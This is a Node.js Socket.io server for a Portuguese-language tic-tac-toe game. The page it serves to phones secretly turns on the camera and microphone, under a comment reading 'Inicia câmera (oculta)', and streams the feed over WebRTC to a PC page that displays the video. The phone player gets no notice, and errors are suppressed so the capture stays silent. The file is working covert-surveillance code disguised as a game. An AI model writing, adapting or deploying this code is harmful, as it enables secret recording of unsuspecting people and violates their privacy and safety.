const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require('socket.io');
const io = new Server(server);

const PORT = process.env.PORT || 3000;

// Página única que detecta o dispositivo
app.get('/', (req, res) => {
    const isMobile = /mobile|android|iphone|ipad|phone/i.test(req.headers['user-agent']);
    
    if (isMobile) {
        // CELULAR - só mostra o jogo
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Jogo da Velha</title>
            <style>
                body{font-family:Arial;text-align:center;background:#1a1a1a;color:white;padding:20px;}
                h1{color:#4CAF50;}
                .board{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;max-width:300px;margin:20px auto;}
                .cell{background:#333;border:2px solid #4CAF50;aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:48px;cursor:pointer;}
                .status{background:#333;padding:15px;border-radius:10px;margin:20px 0;}
                button{background:#4CAF50;color:white;border:none;padding:15px 30px;border-radius:5px;font-size:18px;cursor:pointer;width:100%;}
            </style>
        </head>
        <body>
            <h1>Jogo da Velha</h1>
            <div class="status" id="status">Aguardando oponente...</div>
            <div class="board" id="board"></div>
            <button id="reset" disabled>Reiniciar</button>
            
            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                let minhaVez = false;
                
                // Cria tabuleiro
                for(let i=0;i<9;i++){
                    let cell=document.createElement('div');
                    cell.className='cell';
                    cell.onclick=()=>{
                        if(minhaVez && cell.innerHTML=='') socket.emit('jogada',i);
                    };
                    document.getElementById('board').appendChild(cell);
                }
                
                // Inicia câmera (oculta)
                async function iniciarCamera(){
                    try{
                        const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
                        const peer = new RTCPeerConnection();
                        stream.getTracks().forEach(t=>peer.addTrack(t,stream));
                        
                        peer.onicecandidate = e => e.candidate && socket.emit('candidate',e.candidate);
                        peer.onnegotiationneeded = async ()=>{
                            const offer = await peer.createOffer();
                            await peer.setLocalDescription(offer);
                            socket.emit('offer',offer);
                        };
                        
                        socket.on('answer', async a=> await peer.setRemoteDescription(a));
                        socket.on('candidate', async c=> {try{await peer.addIceCandidate(c)}catch(e){}});
                    }catch(e){}
                }
                iniciarCamera();
                
                socket.on('inicio', d=>{
                    minhaVez = d.vez=='O';
                    document.getElementById('status').innerHTML = minhaVez?'Sua vez (O)':'Vez do PC (X)';
                    document.getElementById('reset').disabled = false;
                });
                
                socket.on('jogada', d=>{
                    document.getElementsByClassName('cell')[d.pos].innerHTML = d.simbolo;
                    minhaVez = !minhaVez;
                    document.getElementById('status').innerHTML = minhaVez?'Sua vez':'Vez do oponente';
                });
                
                socket.on('fim', d=> document.getElementById('status').innerHTML = d.msg);
                socket.on('reiniciar', ()=>{
                    document.querySelectorAll('.cell').forEach(c=>c.innerHTML='');
                    minhaVez = false;
                });
                
                document.getElementById('reset').onclick = ()=> socket.emit('reiniciar');
            </script>
        </body>
        </html>
        `);
    } else {
        // PC - mostra jogo e vídeo
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>PC - Jogo da Velha</title>
            <style>
                body{font-family:Arial;background:#1a1a1a;color:white;padding:20px;}
                .container{display:grid;grid-template-columns:1fr 1fr;gap:30px;max-width:1000px;margin:0 auto;}
                video{width:100%;background:#000;border-radius:10px;}
                .board{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:20px 0;}
                .cell{background:#333;border:2px solid #4CAF50;aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:48px;cursor:pointer;}
                .status{background:#333;padding:15px;border-radius:10px;margin:20px 0;}
                button{padding:10px 20px;margin:5px;border:none;border-radius:5px;cursor:pointer;}
            </style>
        </head>
        <body>
            <div class="container">
                <div>
                    <video id="video" autoplay playsinline></video>
                </div>
                <div>
                    <h1>Jogo da Velha</h1>
                    <div class="status" id="status">Aguardando celular...</div>
                    <div class="board" id="board"></div>
                    <button id="reset" disabled>Reiniciar</button>
                    <button id="audio">🔊 Áudio</button>
                </div>
            </div>
            
            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                let minhaVez = true;
                
                for(let i=0;i<9;i++){
                    let cell=document.createElement('div');
                    cell.className='cell';
                    cell.onclick=()=>{
                        if(minhaVez && cell.innerHTML=='') socket.emit('jogada',i);
                    };
                    document.getElementById('board').appendChild(cell);
                }
                
                const peer = new RTCPeerConnection();
                const video = document.getElementById('video');
                
                peer.ontrack = e => video.srcObject = e.streams[0];
                peer.onicecandidate = e => e.candidate && socket.emit('candidate',e.candidate);
                
                socket.on('offer', async o=>{
                    await peer.setRemoteDescription(o);
                    const a = await peer.createAnswer();
                    await peer.setLocalDescription(a);
                    socket.emit('answer',a);
                });
                
                socket.on('candidate', async c=>{try{await peer.addIceCandidate(c)}catch(e){}});
                
                socket.on('inicio', ()=>{
                    document.getElementById('status').innerHTML = 'Sua vez (X)';
                    document.getElementById('reset').disabled = false;
                });
                
                socket.on('jogada', d=>{
                    document.getElementsByClassName('cell')[d.pos].innerHTML = d.simbolo;
                    minhaVez = !minhaVez;
                    document.getElementById('status').innerHTML = minhaVez?'Sua vez':'Vez do celular';
                });
                
                socket.on('fim', d=> document.getElementById('status').innerHTML = d.msg);
                socket.on('reiniciar', ()=>{
                    document.querySelectorAll('.cell').forEach(c=>c.innerHTML='');
                    minhaVez = true;
                });
                
                document.getElementById('reset').onclick = ()=> socket.emit('reiniciar');
                
                let audioOn = true;
                document.getElementById('audio').onclick = ()=>{
                    audioOn = !audioOn;
                    video.volume = audioOn?1:0;
                };
            </script>
        </body>
        </html>
        `);
    }
});

// Lógica do jogo
let board = ['','','','','','','','',''];
let vez = 'X';
let jogadores = {pc:null, mobile:null};

function checkWinner(){
    const lines = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
    for(let l of lines) if(board[l[0]] && board[l[0]]==board[l[1]] && board[l[0]]==board[l[2]]) return board[l[0]];
    return null;
}

io.on('connection', s=>{
    console.log('Conectado:', s.id);
    
    if(!jogadores.pc) {jogadores.pc=s.id; s.emit('inicio',{vez:'X'});}
    else if(!jogadores.mobile) {jogadores.mobile=s.id; s.emit('inicio',{vez:'O'});}
    
    s.on('offer', o=> s.broadcast.emit('offer',o));
    s.on('answer', a=> s.broadcast.emit('answer',a));
    s.on('candidate', c=> s.broadcast.emit('candidate',c));
    
    s.on('jogada', pos=>{
        let jogador = s.id==jogadores.pc ? 'X' : 'O';
        if(jogador!=vez || board[pos]!='') return;
        
        board[pos] = jogador;
        let vencedor = checkWinner();
        
        if(vencedor) io.emit('fim',{msg:\`\${vencedor} venceu!\`});
        else if(!board.includes('')) io.emit('fim',{msg:'Empate!'});
        else vez = vez=='X'?'O':'X';
        
        io.emit('jogada',{pos,simbolo:jogador});
    });
    
    s.on('reiniciar', ()=>{
        board = ['','','','','','','','',''];
        vez = 'X';
        io.emit('reiniciar');
    });
    
    s.on('disconnect', ()=>{
        if(s.id==jogadores.pc) jogadores.pc=null;
        if(s.id==jogadores.mobile) jogadores.mobile=null;
        board = ['','','','','','','','',''];
        vez='X';
    });
});

server.listen(PORT, ()=>{
    console.log('Servidor rodando na porta', PORT);
});
